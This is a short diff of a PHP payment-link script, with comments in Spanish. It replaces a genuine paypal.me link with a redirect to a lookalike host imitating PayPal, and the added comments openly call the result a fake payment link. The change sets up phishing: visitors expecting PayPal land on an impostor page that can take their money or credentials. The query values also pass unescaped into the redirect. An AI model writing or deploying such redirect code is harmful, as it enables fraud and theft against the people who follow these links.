@@ -5,10 +5,10 @@ $name = $_GET['n'] ?? '';
 $user = $_GET['u'] ?? '';
 $pic = $_GET['pic'] ?? '';
 
-// Generar el enlace de pago
-$paylink = "https://paypal.me/$user?name=$name&pic=$pic";
+// Generar el enlace de pago falso
+$paylink = "https://paypal-me.onrender.com/pago.php?n=$name&u=$user&pic=$pic";
 
-// Redirigir al enlace de pago
+// Redirigir al enlace de pago falso
 header("Location: $paylink");
 exit();
 ?>
